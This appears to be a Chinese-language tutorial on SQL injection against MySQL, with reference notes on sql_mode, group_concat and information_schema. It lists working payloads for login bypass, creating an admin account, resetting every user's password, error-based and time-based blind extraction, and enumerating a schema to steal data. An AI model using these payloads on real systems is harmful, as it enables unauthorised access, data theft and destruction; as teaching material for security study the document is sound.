一、SQL注入

1、原理

解释型语言的执行方式产生了_代码注入_的漏洞。利用这种漏洞提交含语法的句式，从而对程序进行攻击

2、基本漏洞

1. 假设有一个登陆界面，需提交用户名及密码。若已知用户名为guoyanan，则可构造guoyanan' --输入进用户名,程序将执行SELECT * FROM XX WHERE username='guoyanan' -- '........., --后面的语句将被当成注释忽略,起到绕过密码的作用。

*2.OR 1=1 -- 一样可以起到这种作用，提交后，程序将执行SELECT * FROM XX WHERE username=' ' OR 1=1 --,执行的结果将会返回XX表中的所有数据 *

3.因为提交的句式的末尾会生成一个 ‘ ，我们也可以提交guoyanan' OR 'a'='a从而不用注释也可以平衡执行语句的引号。

常用的万能username语句：

  • a ’ or 1=1 #
  • a ") or 1=1 #
  • a‘) or 1=1 #*
  • a” or “1”=”1
  • ' or '1'='1
  • ' or (length(database())) = 8 (用于输入’ “都没有错误)
  • ' or (ascii(substr((select database()) ,1,1))) = 115 # (用于输入’ “都没有错误)
  • ") or ("1")=("1
  • ") or 1=1 or if(1=1, sleep(1), null) #
  • ") or (length(database())) = 8 #
  • ") or (ascii(substr((select database()) ,1,1))) = 115 or if(1=1, sleep(1), null) #
  • **当注释符被过滤时，可以采用 or' 来替代注释符的作用

3.INSERT语句

INSERT用于创建一新行，例如INSERT INTO XX (name,year,sex,isadmin) VALUE ('guoyanan',19,1,0)，其中isadmin代表是否具有管理员权限。

我们可以建立一个新行，提交admin',100,1,1) --来创建一个具有管理员权限的帐号，若是字段中含有密码password,我们就可以随便设立一个密码，通过已知密码的管理员帐号进入数据库了。

另外，通过拦截到的数据库的版本字符串，把它插入自己用户资料的一个字段中；一般数据库会显示其版本信息。

有时候我们并不知道有多少个字段，我们就可以逐个增加，从guoyanan',1) --到guoyanan',1,1,1....) --,因为大部分数据库会自动将整数转为字符串。若是1被拒绝，可以尝试200，2000之类。

4、UPDATE语句

UPDATE XX SET password ='new-pass' WHERE user='xx' and password='old-pass',将某一行原有某字段的值替换为新的。我们依然可以通过绕过来更新别人的密码。例如输入XX' --，如果将注释符替换为or 1=1 --,那就能替换所有用户的密码了，

5、DELETE语句

DELETE用于删除表中一个或多个行。与UPDATE类似，可以恶意破坏数据

7、报错注入

十种常见注入

1.floor()

select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);

2、extractvalue()

select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));

3、updatexml()

select * from test where id=1 and (updatexml(1,concat(‘~’,(select user()),‘~’),1));

4、geometrycollection()

select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));

5、multipoint()

select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));

剩下的还有polygon，multipolygon，linestring，multilinestring，exp

但是常见的只有floor，updatexml，extractvalue三种~

1、返回值只有TRUE或FALSE

9、时间盲注

有时候在SQL语句执行后，页面并不会返回数据到前端，因此可采用时间盲注判断

' or sleep(3)%23

' or if(database='happy',sleep(3),0)

(若查询结果正确，则延迟3秒，否则无延时

10、堆叠注入

在正常的语句后面加分号（；），可顺序执行多条语句，从而造成注入漏洞。适用于UNION被过滤的情况但只返回一个结果。

12、sql_mode

sql_mode是一组mysql支持的基本语法及校验规则

可以通过set sql_mode=xxxx来改变规则

STRICT_TRANS_TABLES：
在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制。必须设置，以后各项可能依赖于该项的设置
NO_ENGINE_SUBSTITUTION：
如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常
ONLY_FULL_GROUP_BY：
对于GROUP BY操作，如果在SELECT中出现的单独的列，没有在GROUP BY子句中出现，那么这个SQL是不合法的
NO_AUTO_VALUE_ON_ZERO：
该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。如果用户希望插入的值为0，而该列又是自增长的，那么这个选项就有用了
NO_ZERO_IN_DATE：
在严格模式下，不允许日期和月份为零
NO_ZERO_DATE：
设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告
ERROR_FOR_DIVISION_BY_ZERO：
在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULL
NO_AUTO_CREATE_USER：
禁止GRANT语句创建密码为空的用户
PIPES_AS_CONCAT：
将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似
ANSI_QUOTES：
启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符
也可以在命令行查看和设置sql_mode变量
查看全局的以及当前会话的sql_mode设置
SELECT @@global.sql_mode,@@session.sql_mode;
设置全局的以及当前会话的sql_mode设置：
SET @@global.sql_mode=‘STRICT_TRANS_TABLES,NO_ENGINE_SUBSTITUTION,no_zero_date,no_zero_in_date,PIPES_AS_CONCAT’;
SET @@sql_mode=‘STRICT_TRANS_TABLES,NO_ENGINE_SUBSTITUTION,no_zero_date,no_zero_in_date,PIPES_AS_CONCAT’;
全局设置影响从那时起新连接的所有客户端，设置SESSION变量只影响当前的客户端

全局和会话的概念:
全局就是影响整个数据库
会话就是影响当前连接的会话,如果会话终止,设置的参数值失效.
静态参数和动态参数:
静态参数:只有数据库进行重启才会生效(数据库安装时就要确定好)
动态参数:在数据库运行过程中可以随时修改

13、函数

1、group by

根据“By”指定的规则对数据进行分组。将一个“数据集”划分成若干个“小区域”，然后针对若干个“小区域”进行数据处理。

例如，现有一张表A,有三个字段，但是类别字段下有重名的id，要把类别相同的归为一组

select 类别, sum(数量) as 数量之和 from A group by 类别

结果为：

group by语句中select指定的字段必须是“分组依据字段”，其他字段若想出现在select中则必须包含在聚合函数中，常见的聚合函数如下：

函数 作用 支持性
sum(列名) 求和
max(列名) 最大值
min(列名) 最小值
avg(列名) 平均值
first(列名) 第一条记录 仅Access支持
last(列名) 最后一条记录 仅Access支持
count(列名) 统计记录数 注意和count(*)的区别

2、concat ()

功能：将多个字符串连接成一个字符串。

语法：concat(str1, str2,...)

返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。

例如：select concat (类别，','，数量) as info from A; //其中，','是分隔符

3、group_concat()

group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator '分隔符'])

将group by分的组连接起来，例如：select 类别，group_concat(数量,',') from A group by 类别

结果为

类别 数量
a 5,2,11
b 10,6,3
c 9,9,8,7,4

14、数据的结构

1、元数据

元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。
有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。

2、information_schema

这是一个数据库，存储了元数据，提供了访问元数据的方式

进入：use information_schema

在该数据库中有一个table叫schemata,描述了整个MySQL 下所有数据库。 SELECT * FROM information_schema.SCHEMATA

当我们得到了数据库的名字时，我们就可以对数据库中的表进行查询，例如查询geek数据库下的表内容：

SELECT group_concat(table_name) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'geek'

当我们知道了表的名字时，我们可以对表中字段进行查询，例如查询geekuser表下的字段：

SELECT group_concat(column_name), DATA_TYPE FROM information_schema.COLUMNS WHERE TABLE_NAME = 'geekuser'

所以，我们可以像这样，利用联合注入，去顺藤摸瓜，窃取数据库的数据
